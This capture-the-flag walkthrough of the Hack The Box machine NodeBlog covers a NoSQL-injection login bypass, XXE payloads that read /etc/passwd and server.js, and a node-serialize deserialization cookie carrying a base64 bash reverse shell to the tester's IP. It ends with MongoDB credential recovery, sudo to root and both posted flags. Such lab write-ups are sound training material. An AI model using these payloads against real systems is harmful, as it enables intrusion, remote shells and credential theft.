---
title: "NodeBlog from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# NodeBlog from HTB
`nmap`gave this:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
turn on `burpsuite + intercept`and try to login like this
```
------------------------
Content-Type: application/json
------------------
-------------
{"user":"admin","password":{"$ne":"admin"}}
```
`uploading file`
```
Invalid XML Example: Example DescriptionExample Markdown
```
Must me `xml`
`file.xml`
```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY help SYSTEM "file:///etc/passwd">
]>
<post>
<title>shavigio</title>
<description>Read File</description>
<markdown>&help;</markdown>
</post>
```
Uploaded and got this:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
admin:x:1000:1000:admin:/home/admin:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mongodb:x:109:117::/var/lib/mongodb:/usr/sbin/nologin
```
only user that has `/bin/bash`is admin
Since `server.js` is commonly used for `NodeJS` applications, we update our payload to target the `/opt/blog/server.js` file.
Code will be like
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY help SYSTEM "file:///opt/blod/server.js">
]>
<post>
<title>shavigio</title>
<description>Read File</description>
<markdown>&help;</markdown>
</post>
```
After uploading i got this:
```bash
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}


app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)


app.listen(5000)
```
From here we get that cookie is `url encoded json`
Which if we `url-decode` get :
```js
%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D




{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```
There is an exploit for `node-serialize`which allows us to do `RCE` and in this instance we should change the cookie or add that payload to the cookie. To get `reverse shell`we need to inject payload then do `base64`encoding and write that in this code.
```
Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'<your_code>\', function(error, stdout, stderr) { console.log(stdout) });}()"}
```
Then do `url-encode all characters`
For me it was
```bash
 echo -n "bash -i  >& /dev/tcp/10.10.16.6/1234  0>&1" | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNi8xMjM0ICAwPiYx

Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\echo -n 'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNi8xMjM0ICAwPiYx|base64 -d |bash'\', function(error, stdout, stderr) { console.log(stdout) });}()"}
# url-encode all chars
```
This is how `burpsuite payload`should look like:
```GET / HTTP/1.1
Host: 10.10.11.139:5000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Cookie: auth=%7b%22%75%73%65%72%22%3a%22%61%64%6d%69%6e%22%2c%22%73%69%67%6e%22%3a%22%32%33%65%31%31%32%30%37%32%39%34%35%34%31%38%36%30%31%64%65%62%34%37%64%39%61%36%63%37%64%65%38%22%2c%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%5c%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%5c%22%29%2e%65%78%65%63%28%5c%22%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%32%4c%7a%45%79%4d%7a%51%67%4d%44%34%6d%4d%51%3d%3d%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%5c%22%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d
Accept-Language: en-US,en
Referer: http://10.10.11.139:5000/articles/xml
Accept-Encoding: gzip, deflate, br
If-None-Match: W/"a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA"
Connection: keep-alive
```
Then send it
After got the connection on `netcat`
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.139] 59546
bash: cannot set terminal process group (833): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
admin@nodeblog:/opt/blog$ id
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@nodeblog:/opt/blog$ ls -la /home
ls -la /home
total 16
drwxr-xr-x 1 root  root   10 Dec 27  2021 .
drwxr-xr-x 1 root  root  180 Dec 27  2021 ..
drw-r--r-- 1 admin admin 220 Jan  3  2022 admin
admin@nodeblog:/opt/blog$ chmod +x /home/admin
chmod +x /home/admin
admin@nodeblog:/opt/blog$ cat /home/admin/user.txt
cat /home/admin/user.txt
4364ebd88bf3569f41984a1fa498b943
admin@nodeblog:/opt/blog$ ss -tlnp
ss -tlnp
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN  0        4096           127.0.0.1:27017          0.0.0.0:*
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*
LISTEN  0        128                 [::]:22                [::]:*
LISTEN  0        511                    *:5000                 *:*      users:(("node /opt/blog/",pid=833,fd=20))



admin@nodeblog:/opt/blog$ mongo
mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017

> show dbs
shshow dbs
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB
> use blog
ususe blog
switched to db blog
> show collections
shshow collections
articles
users
> db.users.find()
dbdb.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
> exit
exexit
bye




admin@nodeblog:/opt/blog$ sudo -l
sudo -l
[sudo] password for admin: IppsecSaysPleaseSubscribe

Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL


admin@nodeblog:/opt/blog$ sudo su
sudo su
root@nodeblog:/opt/blog# cat /root/root.txt
cat /root/root.txt
523ce040c4e3d05b66d0fbd8298e088f
```
***
User Flag is: 4364ebd88bf3569f41984a1fa498b943
Root Flag is: 523ce040c4e3d05b66d0fbd8298e088f
***
![](/assets/images/Screenshot from 2024-08-19 23-48-51.png)
